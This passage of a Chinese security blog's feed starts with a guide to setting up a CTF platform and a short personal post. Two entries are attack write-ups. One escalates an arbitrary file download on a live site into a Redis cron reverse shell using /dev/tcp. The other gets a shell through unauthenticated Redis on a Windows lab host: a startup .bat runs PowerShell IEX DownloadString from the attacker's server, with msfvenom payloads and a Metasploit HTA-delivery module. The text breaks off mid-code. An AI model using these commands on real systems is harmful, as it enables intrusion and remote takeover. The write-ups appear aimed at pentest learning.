        <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>“最近好忙呀…又准备办一场学校的CTF比赛…”</p><p>在Github上发现了一个开源的CTF平台，界面很好看，而且是php写的，所以决定搭建一下折腾折腾。</p><p><strong>项目地址：</strong><a href="https://github.com/safflower/canhackme" target="_blank" rel="noopener">https://github.com/safflower/canhackme</a></p><p><strong>项目官网：</strong><a href="https://canhack.me" target="_blank" rel="noopener">https://canhack.me</a></p><h1 id="搭建记录"><a href="#搭建记录" class="headerlink" title="搭建记录"></a>搭建记录</h1><h2 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h2><ul><li>Ubuntu 16.04</li><li>Apache 2.4</li><li>PHP 7.3</li></ul><h2 id="安装Apache2-4"><a href="#安装Apache2-4" class="headerlink" title="安装Apache2.4"></a>安装Apache2.4</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install apache2</span><br><span class="line"></span><br><span class="line">root@linuz:/# apache2 -v</span><br><span class="line">Server version: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Server built:   2019-08-26T13:43:29</span><br></pre></td></tr></table></figure><h2 id="安装PHP7-3"><a href="#安装PHP7-3" class="headerlink" title="安装PHP7.3"></a>安装PHP7.3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install software-properties-common</span><br><span class="line">sudo add-apt-repository ppa:ondrej/php</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y php7.3</span><br><span class="line"></span><br><span class="line">root@linuz:/# php -v</span><br><span class="line">PHP 7.3.9-1+ubuntu16.04.1+deb.sury.org+1 (cli) (built: Sep  2 2019 12:54:04) ( NTS )</span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line">Zend Engine v3.3.9, Copyright (c) 1998-2018 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.3.9-1+ubuntu16.04.1+deb.sury.org+1, Copyright (c) 1999-2018, by Zend Technologies</span><br></pre></td></tr></table></figure><p>安装完记得测试一下。</p><h2 id="安装Sqlite3"><a href="#安装Sqlite3" class="headerlink" title="安装Sqlite3"></a>安装Sqlite3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install sqlite3</span><br></pre></td></tr></table></figure><h2 id="安装php-sqlite3模块"><a href="#安装php-sqlite3模块" class="headerlink" title="安装php-sqlite3模块"></a>安装php-sqlite3模块</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install php7.3-sqlite3</span><br></pre></td></tr></table></figure><p>修改php.ini文件<code>/etc/php/7.3/apache2/php.ini</code>945行，把前面的分号去掉</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=sqlite3</span><br></pre></td></tr></table></figure><h2 id="安装php-mbstring模块"><a href="#安装php-mbstring模块" class="headerlink" title="安装php-mbstring模块"></a>安装php-mbstring模块</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install php-mbstring</span><br></pre></td></tr></table></figure><p>修改php.ini文件<code>/etc/php/7.3/apache2/php.ini</code>923行，把前面的分号去掉</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=mbstring</span><br></pre></td></tr></table></figure><h2 id="克隆canhackme项目"><a href="#克隆canhackme项目" class="headerlink" title="克隆canhackme项目"></a>克隆canhackme项目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/area39/canhackme.git</span><br></pre></td></tr></table></figure><p>部署的时候注意权限问题，把<code>.git</code>文件夹删除，还有必须得把<code>.htaccess</code>这个文件放到网站根目录</p><h2 id="修改apache2配置文件"><a href="#修改apache2配置文件" class="headerlink" title="修改apache2配置文件"></a>修改apache2配置文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apache2/apache2.conf</span><br></pre></td></tr></table></figure><p>修改(164~168行)，把路径改成你实际的网站根目录，<code>AllowOverride None</code>改为<code>AllowOverride ALL</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory /var/www/html&gt;</span><br><span class="line">        Options Indexes FollowSymLinks</span><br><span class="line">        AllowOverride ALL</span><br><span class="line">        Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure><h2 id="开启mod-rewrite模块"><a href="#开启mod-rewrite模块" class="headerlink" title="开启mod_rewrite模块"></a>开启mod_rewrite模块</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo a2enmod rewrite</span><br></pre></td></tr></table></figure><p>然后重启一下apache</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 restart</span><br></pre></td></tr></table></figure><h2 id="导入数据库"><a href="#导入数据库" class="headerlink" title="导入数据库"></a>导入数据库</h2><p>进入到<code>@import/confs/</code>目录下，导入<code>init.sql</code>文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sqlite3 .common.db &lt; init.sql</span><br><span class="line">root@linuz:/var/www/html/@import/confs# sqlite3 .common.db</span><br><span class="line">SQLite version 3.11.0 2016-02-15 17:29:24</span><br><span class="line">Enter &quot;.help&quot; for usage hints.</span><br><span class="line">sqlite&gt; .dump</span><br><span class="line">PRAGMA foreign_keys=OFF;</span><br><span class="line">BEGIN TRANSACTION;</span><br><span class="line">CREATE TABLE `users` (</span><br><span class="line">        `user_no` INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">        `user_name` TEXT NOT NULL UNIQUE,</span><br><span class="line">        `user_email` TEXT NOT NULL UNIQUE,</span><br><span class="line">        `user_password` TEXT NOT NULL,</span><br><span class="line">        `user_comment` TEXT NOT NULL,</span><br><span class="line">        `user_score` INTEGER NOT NULL,</span><br><span class="line">        `user_signed_up_at` DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP</span><br><span class="line">);</span><br><span class="line">......</span><br><span class="line">sqlite&gt; .exit</span><br></pre></td></tr></table></figure><p>然后更改<code>confs</code>目录权限为<code>www-data</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chown -R www-data:www-data confs/</span><br></pre></td></tr></table></figure><p>此时你的CanHackMe虽然能访问了，但其实还有一堆问题</p><h1 id="后续完善"><a href="#后续完善" class="headerlink" title="后续完善"></a>后续完善</h1><h2 id="写入-hash-salt-txt文件"><a href="#写入-hash-salt-txt文件" class="headerlink" title="写入.hash_salt.txt文件"></a>写入.hash_salt.txt文件</h2><p>加盐加盐加盐，内容自己写就好！</p><p>注意是在<code>@import/confs/</code>目录下创建<code>.hash_salt.txt</code>文件</p><h2 id="recaptcha"><a href="#recaptcha" class="headerlink" title="recaptcha"></a>recaptcha</h2><p>因为作者是国外的嘛，所以加了个Google的recaptcha验证功能，所以，你懂的…这是个大坑</p><p>先注册一个recaptcha(第3版)</p><p>地址：<a href="https://www.google.com/recaptcha" target="_blank" rel="noopener">https://www.google.com/recaptcha</a></p><p>把域名或者IP填好，然后你会拿到两个key</p><p><img src="/img/2019/09/12/005R6Otmgy1g6urcyun20j30vm0f2t9x.jpg" alt></p><p>网站的配置文件为<code>common.php</code>,路径<code>@import/confs/common.php</code></p><p>在这个配置文件里，你可以修改一些网站的基本信息，包括网站URL，作者信息等</p><p><img src="/img/2019/09/12/005R6Otmgy1g6urfzl3maj30zd0iuq4d.jpg" alt></p><p>把拿到的key替换一下</p><p>第一条密钥替换<code>common.php</code>文件里的<code>recaptcha_sitekey</code>内容</p><p>第二条密钥编辑成<code>.recaptcha_secretkey.txt</code>文件，放到<code>@import/confs</code>路径下</p><p>在国内访问解决方法：</p><p>修改网站php文件，把<code>https://www.google.com</code>改成<code>https://www.recaptcha.net</code></p><p><img src="/img/2019/09/12/005R6Otmgy1g6urxjrhzlj30vj0b4aap.jpg" alt></p><p><img src="/img/2019/09/12/005R6Otmgy1g6urxxu7rrj30uv0b6wf4.jpg" alt></p><p>需要修改的几个文件</p><ul><li>@import/init.php</li><li>@import/views/challenges/challenges.php</li><li>@import/views/users/settings.php</li><li>@import/views/users/sign-in.php</li><li>@import/views/users/sign-up.php</li></ul><h2 id="关于flag"><a href="#关于flag" class="headerlink" title="关于flag"></a>关于flag</h2><p>flag默认的格式为<code>CanHackMe{...}</code>且长度不小于10位数，具体可以在<code>init.php</code>这个文件中修改。</p><p>大概在493行，把<code>CanHackMe</code>修改成你想要的格式。</p><p><img src="/img/2019/09/12/005R6Otmly1g6vri32e7ij31090a4gm5.jpg" alt></p><h2 id="创建题目"><a href="#创建题目" class="headerlink" title="创建题目"></a>创建题目</h2><p>这个平台没有后台，所以必须直接访问sqlite数据库然后添加通知和题目。</p><p>添加一个题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; INSERT INTO &quot;chals&quot; VALUES(1,&apos;name&apos;,&apos;title&apos;,&apos;contents&apos;,100,&apos;CanHackMe&#123;xxxxxxxxxxxx&#125;&apos;,&apos;web&apos;,&apos;1&apos;,&apos;2019-09-12&apos;);</span><br></pre></td></tr></table></figure><p><img src="/img/2019/09/12/005R6Otmgy1g6wqb0rtzlj310c0flaaq.jpg" alt></p><h2 id="创建公告"><a href="#创建公告" class="headerlink" title="创建公告"></a>创建公告</h2><p>添加一个通知：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; INSERT INTO &quot;notis&quot; VALUES(1,&apos;公告内容&apos;,1,&apos;2019-09-12&apos;);</span><br></pre></td></tr></table></figure><p><img src="/img/2019/09/12/005R6Otmgy1g6wqbnlk1aj310n0b2wev.jpg" alt></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>搭建过程中遇到几个奇奇怪怪的问题，和作者反馈后，作者小改动了几次，所以安装的时候还是clone我保存的以前的代码吧。</p><p>地址：<a href="https://github.com/Area39/canhackme" target="_blank" rel="noopener">https://github.com/Area39/canhackme</a></p><p>如果想汉化，那就自己改一下源代码吧。</p><p>最后附一张安装成功的图。</p><p><img src="/img/2019/09/12/005R6Otmgy1g6wqcb5zn2j31hc0ogtc6.jpg" alt></p><h1 id="2020年更新"><a href="#2020年更新" class="headerlink" title="2020年更新"></a>2020年更新</h1><p>后续跟作者反馈了很多次，作者最终把<code>recaptcha</code>功能改成了可有可无的模式，搭建的时候在配置文件中改一下就好了。</p><blockquote><p>项目地址：<a href="https://github.com/safflower/canhackme" target="_blank" rel="noopener">https://github.com/safflower/canhackme</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 平台搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 平台搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从任意文件下载到Getshell</title>
      <link href="/2019/08/31/Arbitrary-file-download/"/>
      <url>/2019/08/31/Arbitrary-file-download/</url>
      
        <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>在某网站下载素材，下载的时候看了下URL，然后发现了惊喜</p><p>花里胡哨的就不整了，待我口述一下思路<br><img src="/img/2019/08/31/005R6Otmgy1g6e7batq6zj30a506ot8s.jpg" alt></p><p>看到下载链接的URL如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=/xxx/xxx/xxx.zip</span><br></pre></td></tr></table></figure><p>感觉可能存在任意文件下载漏洞，然后试了一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=/etc/passwd</span><br></pre></td></tr></table></figure><p>可以成功下载，下载下来文件自动加了.zip后缀且无法解压。不慌，直接拿notepad++一类的工具打开即可。<br>整理一下Linux下常见的敏感文件(需首先判断服务器操作系统版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd  #看一下存在哪些用户和服务，如果某些用户有bash，可以读一下他的.bash_history</span><br><span class="line">/etc/shadow  #shadow文件，但是很难破解</span><br><span class="line">/root/.bash_history  #root用户操作历史命令记录，可能会泄露服务器根路径，mysql密码，一些服务启动脚本等</span><br><span class="line">/root/.mysql_history  #mysql历史命令记录文件</span><br><span class="line">/var/lib/mlocate/mlocate.db  #本地所有文件信息</span><br><span class="line">/etc/ssh/sshd_config  #ssh配置文件，如果对外开放可看到端口</span><br><span class="line"></span><br><span class="line">apache：</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/etc/apache2/httpd.conf</span><br><span class="line">/etc/apache2/apache2.conf</span><br><span class="line"></span><br><span class="line">nginx：</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/usr/local/nginx/conf/nginx.conf</span><br><span class="line">/usr/local/etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line">redis：</span><br><span class="line">/etc/redis.conf</span><br></pre></td></tr></table></figure><p>以上的总结都是一些固定位置的配置文件，当然实际中这些路径不一定对，需要你结合.bash_history等信息自己去猜测。</p><p>针对Linux系统任意文件下载的几种思路：</p><ul><li>下载源代码审计</li><li>数据库备份</li><li>信息收集</li><li>中间件</li><li>…</li></ul><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>首先是下载.bash_history文件分析了一下，得到以下信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">网站根目录</span><br><span class="line">几个服务启动/数据库备份脚本(xxx.sh)</span><br><span class="line">服务器运行着几个服务：</span><br><span class="line">1.apache-tomcat</span><br><span class="line">2.nginx</span><br><span class="line">3.redis</span><br></pre></td></tr></table></figure><p>随后下载了某数据库自动备份脚本(xxx.sh)得到数据库的连接地址以及账号密码。<br>下载redis.conf配置文件得到redis密码。</p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>遇到的几个问题：</p><ul><li>数据库是某云的，是内网ip，所以无法用外网连接。</li><li>针对java的站如果下载源代码审计会很麻烦</li><li>web.xml文件找不到</li><li>找不到数据库备份文件(即使找到也不敢下载)</li><li>…</li></ul><p>推荐个工具(基于java任意文件读取设计自动化信息搜集工具)：</p><blockquote><p><a href="https://github.com/Artemis1029/Java_xmlhack/" target="_blank" rel="noopener">https://github.com/Artemis1029/Java_xmlhack/</a></p></blockquote><h1 id="转折点"><a href="#转折点" class="headerlink" title="转折点"></a>转折点</h1><p>一开始用nmap没扫到redis的端口，后来全端口扫描，发现redis端口对外开放了。<br>所以这样就简单多了，可以利用redis反弹shell<br>先在服务器用nc监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure><p>然后连接redis</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h xxx.xxx.xxx.xxx(目标ip) -p 6379 -a password(密码)</span><br></pre></td></tr></table></figure><p>写入计划任务反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set test &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx(服务器ip)/8888 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>等待一分钟即可拿到shell</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>运气很重要<br>前期的信息收集也很重要<br>Redis真是一个神奇的东西<br>PS:该漏洞已经第一时间通知厂商并已经进行了修复。<br><strong>声明：本文的初衷就是分享网络安全知识，若有读者因此做出任何危害网络安全的行为，请后果自负。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重拾初心</title>
      <link href="/2019/08/26/Primal-desires/"/>
      <url>/2019/08/26/Primal-desires/</url>
      
        <content type="html"><![CDATA[<p><strong>暑假即将结束，这个假期说短不短，说长也不长。</strong></p><p><strong>开学也就意味着已经大三了，不得不感叹时间过得可真快~</strong></p><p><strong>20岁，正是一个努力奋斗的年纪，开学后会好好学习，好好训练。</strong></p><p><strong>最近新开了一个微信公众号，名字叫”一寸黑”，这个名字琢磨了很久，含义看大家怎么理解了。</strong></p><p><strong>以后如果有质量好的文会优先放到”一寸黑”微信公众号上，欢迎大家关注。</strong></p><p><strong>同时也开了一个知乎专栏，名字也叫”一寸黑”，<a href="https://zhuanlan.zhihu.com/yicunhei" target="_blank" rel="noopener">传送门</a></strong></p><p><strong>看着每天博客都有不少的浏览量，这更坚定了我想跟大家一起学习的决心。</strong></p><p><strong>以后有什么事可以邮件或者公众号后台留言给我(可以加好友交流)，接受任何意见和建议。</strong><br><img src="/img/weixin.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Redis在Windows环境下Getshell方法小结</title>
      <link href="/2019/08/12/Redis-windows-getshell/"/>
      <url>/2019/08/12/Redis-windows-getshell/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Redis未授权访问漏洞很早之前就有了，在实战中如果遇到还是比较幸运的。比如挖到ssrf漏洞，如果内网有个未授权或者弱口令的redis，那么就可以深入的挖掘一下。<br>Redis如果部署在Linux服务器上还好一些，配合nc可以很方便的就拿到了shell。但是如果部署在Windows环境下就比较鸡肋了，虽是这样说，但是也有一些getshell的办法。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>  系统环境：Windows Server 2012<br>  <a href="https://github.com/microsoftarchive/redis/releases/download/win-3.2.100/Redis-x64-3.2.100.msi" target="_blank" rel="noopener">Redis-x64-3.2.100</a></p><h1 id="靶机设置"><a href="#靶机设置" class="headerlink" title="靶机设置"></a>靶机设置</h1><h2 id="配置Redis"><a href="#配置Redis" class="headerlink" title="配置Redis"></a>配置Redis</h2><p>安装完Redis后它的服务就自动启动了，所以需要执行以下几步：<br>1.先停止Redis服务<br><code>redis-server --service-stop</code><br>2.更改配置文件<br>进入Redis的安装目录，然后修改windows.conf文件<br>第56行注释掉<code># bind 127.0.0.1</code>，第75行把<code>protected-mode yes</code>改成<code>protected-mode no</code><br>这样就可以模拟未授权访问的Redis靶机。<br>3.卸载Redis服务<br><code>redis-server --service-uninstall</code><br>4.安装Redis服务<br><code>redis-server --service-install redis.windows.conf</code><br>5.启动redis<br><code>redis-server --service-start</code></p><h2 id="端口设置"><a href="#端口设置" class="headerlink" title="端口设置"></a>端口设置</h2><p>Redis默认端口是6379，所以你需要在windows的防火墙里开放6379端口，或者搭建靶机的时候直接就关闭防火墙。</p><h2 id="测试Redis未授权访问"><a href="#测试Redis未授权访问" class="headerlink" title="测试Redis未授权访问"></a>测试Redis未授权访问</h2><p>我是在Centos7上安装过Redis所以直接拿来用了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost src]# ./redis-cli -h 192.168.230.134</span><br><span class="line">192.168.230.134:6379&gt; ping</span><br><span class="line">PONG</span><br></pre></td></tr></table></figure><p><img src="/img/2019/08/12/007DFXDhgy1g5virmrcpqj30qo07fgly.jpg" alt></p><h2 id="配置Windows-server-2012"><a href="#配置Windows-server-2012" class="headerlink" title="配置Windows server 2012"></a>配置Windows server 2012</h2><p>测试过程中发现，默认是无法在启动项文件夹写文件的，需要把<code>C:\Users\Administrator</code>文件夹的组添加上<code>Everyone</code>并把权限改成完全控制<br>改完以后再测试就可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.230.134:6379&gt; config set dir &quot;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.230.134:6379&gt;</span><br></pre></td></tr></table></figure><h1 id="几种Getshell方法"><a href="#几种Getshell方法" class="headerlink" title="几种Getshell方法"></a>几种Getshell方法</h1><p>方法其实挺多的，但是比较鸡肋，都需要目标主机重启才可以实现…</p><h2 id="利用powershell反弹shell"><a href="#利用powershell反弹shell" class="headerlink" title="利用powershell反弹shell"></a>利用powershell反弹shell</h2><p>1.用msfvenom生成shell.ps1文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -f psh-reflection &gt;shell.ps1</span><br></pre></td></tr></table></figure><p>2.把shell.ps1文件复制到<code>/var/www/html/</code>目录下，然后启动apache2<br><img src="/img/2019/08/12/007DFXDhgy1g5vmuwn1xqj30s106e42w.jpg" alt><br>3.用msf进行监听<br>设置payload的时候注意分清系统是32版本的还是64的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.230.133</span><br><span class="line">lhost =&gt; 192.168.230.133</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.230.133:4444</span><br></pre></td></tr></table></figure><p><img src="/img/2019/08/12/007DFXDhgy1g5vmycq66uj30ny054tbr.jpg" alt><br>4.利用Redis写入bat文件到启动项<br>注意<code>\r\n\r\n</code>代表换行的意思，因为用redis写的文件会自带一些版本信息，如果不换行可能会导致无法执行。反斜杠<code>\</code>可以转义你payload中的双引号<code>&quot;</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.230.134:6379&gt; config set dir &quot;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.230.134:6379&gt; config set dbfilename shell.bat</span><br><span class="line">OK</span><br><span class="line">192.168.230.134:6379&gt; set x &quot;\r\n\r\npowershell -windowstyle hidden -exec bypass -c \&quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.230.133/shell.ps1&apos;);xx.ps1\&quot;\r\n\r\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.230.134:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>5.重启后得到shell<br><img src="/img/2019/08/12/007DFXDhgy1g5vn9veddwj30rn08nte6.jpg" alt></p><h2 id="利用mshta-exe"><a href="#利用mshta-exe" class="headerlink" title="利用mshta.exe"></a>利用mshta.exe</h2><p>到<code>/usr/share/metasploit-framework/modules/exploits/windows</code>目录下创建一个msh_shell.rb文件，复制以下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">##</span><br><span class="line"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="line"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="line">##</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">class MetasploitModule  &lt; Msf::Exploit::Remote</span><br><span class="line">  Rank = NormalRanking</span><br><span class="line">  </span><br><span class="line">  include Msf::Exploit::Remote::HttpServer</span><br><span class="line">  </span><br><span class="line">  def initialize(info  = &#123;&#125;)</span><br><span class="line">    super(update_info(info,</span><br><span class="line">      &apos;Name&apos; =&gt; &apos;Microsoft Office Payload Delivery&apos;,</span><br><span class="line">      &apos;Description&apos; =&gt; %q&#123;</span><br><span class="line">        This module generates an command to place within</span><br><span class="line">        a word document, that when executed, will retrieve a HTA payload</span><br><span class="line">        via HTTP from an web server. Currently have not figured out how</span><br><span class="line">        to generate a doc.</span><br><span class="line">      &#125;,</span><br><span class="line">      &apos;License&apos; =&gt; MSF_LICENSE,</span><br><span class="line">      &apos;Arch&apos; =&gt; ARCH_X86,</span><br><span class="line">      &apos;Platform&apos; =&gt; &apos;win&apos;,</span><br><span class="line">      &apos;Targets&apos; =&gt;</span><br><span class="line">        [</span><br><span class="line">          [&apos;Automatic&apos;, &#123;&#125; ],</span><br><span class="line">        ],</span><br><span class="line">      &apos;DefaultTarget&apos; =&gt; 0,</span><br><span class="line">    ))</span><br><span class="line">  end</span><br><span class="line">  </span><br><span class="line">  def on_request_uri(cli, _request)</span><br><span class="line">    print_status(&quot;Delivering payload&quot;)</span><br><span class="line">    p = regenerate_payload(cli)</span><br><span class="line">    data = Msf::Util::EXE.to_executable_fmt(</span><br><span class="line">      framework,</span><br><span class="line">      ARCH_X86,</span><br><span class="line">      &apos;win&apos;,</span><br><span class="line">      p.encoded,</span><br><span class="line">      &apos;hta-psh&apos;,</span><br><span class="line">      &#123; :arch =&gt; ARCH_X86, :platform =&gt; &apos;win &apos;&#125;</span><br><span class="line">    )</span><br><span class="line">    send_response(cli, data, &apos;Content-Type&apos; =&gt; &apos;application/hta&apos;)</span><br><span class="line">  end</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  def primer</span><br><span class="line">    url = get_uri</span><br><span class="line">    print_status(&quot;Place the following DDE in an MS document:&quot;)</span><br><span class="line">    print_line(&quot;mshta.exe \&quot;#&#123;url&#125;\&quot;&quot;)</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>然后在msf里重新加载所有模块：<code>reload_all</code><br>找到之后就可以使用了</p><figure class="highlight plain"><table><tr><td 